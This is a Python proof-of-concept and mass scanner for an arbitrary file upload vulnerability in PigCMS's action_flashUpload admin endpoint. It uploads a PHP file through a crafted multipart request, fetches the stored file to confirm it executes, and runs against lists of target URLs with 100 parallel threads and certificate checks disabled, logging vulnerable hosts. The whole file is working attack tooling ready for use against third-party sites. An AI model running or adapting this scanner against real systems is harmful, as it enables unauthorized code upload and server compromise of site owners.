import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """_____________        ______________  __________
___  __ \__(_)______ __  ____/__   |/  /_  ___/
__  /_/ /_  /__  __ `/  /    __  /|_/ /_____ \ 
_  ____/_  / _  /_/ // /___  _  /  / / ____/ / 
/_/     /_/  _\__, / \____/  /_/  /_/  /____/  
             /____/                            """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='PigCMS action_flashUpload 任意文件上传漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload1 = '/cms/manage/admin.php?m=manage&c=background&a=action_flashUpload'
    headers = {
        'Accept-Encoding':'gzip, deflate',
        'Content-Type':'multipart/form-data; boundary=----aaa',
    }
    data = '------aaa\r\n\r\nContent-Disposition: form-data; name="filePath"; filename="test.php"\r\nContent-Type: video/x-flv\r\n\r\n<?php echo jqjjqj;?>\r\n------aaa'
    try:
        res1 = requests.post(url=target+payload1,headers=headers,data=data,verify=False,timeout=10)
        url1 = re.findall(r'MAIN_URL_ROOT/(.*?)',res1.text)[0]
        payload2 = f'/cms/{url1}'
        res2 = requests.get(url=target+payload2,verify=False,timeout=10)
        if 'MAIN_URL_ROOT' in res1.text and 'jqjjqj' in res2.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == '__main__':
    main()